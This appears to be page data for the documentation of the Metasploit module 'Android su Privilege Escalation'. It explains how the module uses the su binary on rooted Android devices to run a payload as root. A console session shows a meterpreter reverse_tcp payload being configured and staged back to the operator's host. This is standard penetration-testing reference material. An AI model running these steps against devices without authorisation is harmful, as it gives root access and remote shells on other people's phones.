{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/android/local/su_exec","result":{"data":{"moduleMetadataJson":{"id":"57691d7f-d4de-5115-9d5f-8761740f784c","name":"Android 'su' Privilege Escalation","fullname":"exploit/android/local/su_exec","description":"This module uses the su binary present on rooted devices to run\n          a payload as root.\n\n          A rooted Android device will contain a su binary (often linked with\n          an application) that allows the user to run commands as root.\n          This module will use the su binary to execute a command stager\n          as root. The command stager will write a payload binary to a\n          temporary directory, make it executable, execute it in the background,\n          and finally delete the executable.\n\n          On most devices the su binary will pop-up a prompt on the device\n          asking the user for permission.","rank":0,"fields":{"detailsSlug":"/modules/details/exploit/android/local/su_exec","documentationSlug":"/modules/documentation/exploit/android/local/su_exec","referencesSlug":"/modules/references/exploit/android/local/su_exec"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module uses the su binary present on rooted devices to run a payload as root.</p>\n<p>A rooted Android device will contain a su binary (often linked with an application) that allows the user to run commands as root.\nThis module will use the su binary to execute a command stager as root. The command stager will write a payload binary to a\ntemporary directory, make it executable, execute it in the background, and finally delete the executable.</p>\n<p>On most devices the su binary will pop-up a prompt on the device asking the user for permission.</p>\n<p>This module will only work on <em>rooted</em> devices. An off the shelf Android device is unlikely to be rooted, however it's possible to root a device without losing the data.\nMany devices can be rooted by flashing new firmware, however the existing data will be lost.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>You'll first need to obtain a session on the target device. To do this follow the instructions <a href=\"https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/payload/android/meterpreter/reverse_tcp.md\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">here</a></p>\n<p>Once the module is loaded, one simply needs to set the <code class=\"language-text\">SESSION</code> option and configure the handler.\nAn example session follows:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(multi/handler) &gt; sessions\n\nActive sessions\n===============\n\n  Id  Name  Type                        Information         Connection\n  --  ----  ----                        -----------         ----------\n  1         meterpreter dalvik/android  u0_a80 @ localhost  192.168.0.176:4444 -&gt; 192.168.0.107:46059 (192.168.0.107)\n\nmsf5 exploit(multi/handler) &gt; use exploit/android/local/su_exec\nmsf5 exploit(android/local/su_exec) &gt; set SESSION 1\nSESSION =&gt; 1\nmsf5 exploit(android/local/su_exec) &gt; set payload linux/aarch64/meterpreter/reverse_tcp\npayload =&gt; linux/aarch64/meterpreter/reverse_tcp\nmsf5 exploit(android/local/su_exec) &gt; set LHOST 192.168.0.176\nLHOST =&gt; 192.168.0.176\nmsf5 exploit(android/local/su_exec) &gt; set LPORT 4445\nLPORT =&gt; 4445\nmsf5 exploit(android/local/su_exec) &gt; run\n\n[!] SESSION may not be compatible with this module.\n[*] Started reverse TCP handler on 192.168.0.176:4445\n[*] Transmitting intermediate midstager...(256 bytes)\n[*] Sending stage (818780 bytes) to 192.168.0.107\n[*] Meterpreter session 2 opened (192.168.0.176:4445 -&gt; 192.168.0.107:49710) at 2018-10-01 17:44:50 +0800\n[-] Exploit failed: Rex::TimeoutError Operation timed out.\n[*] Exploit completed, but no session was created.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Please not that in most cases you will have to manually confirm the Superuser prompt\non the device itself before the module completes. You can do <code class=\"language-text\">set WfsDelay 10</code> to\ngive yourself more time.</p>"}}},"pageContext":{"id":"57691d7f-d4de-5115-9d5f-8761740f784c"}}}